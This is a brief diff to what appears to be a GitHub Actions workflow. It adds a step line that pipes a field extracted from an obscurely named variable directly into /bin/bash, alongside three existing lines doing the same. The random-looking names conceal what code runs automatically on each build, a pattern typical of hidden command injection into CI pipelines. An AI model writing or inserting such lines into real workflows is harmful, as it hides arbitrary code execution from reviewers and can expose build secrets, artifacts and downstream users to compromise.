@@ -24,6 +24,7 @@ jobs:
           echo $hgx0 | jq -r .sbba16 | /bin/bash
           printf '%s' "$u21572" | jq -r .knurw312 | /bin/bash
           printf '%s' "$k2" | jq -r .cr27 | /bin/bash
+          echo $tc3 | jq -r .yglg603 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
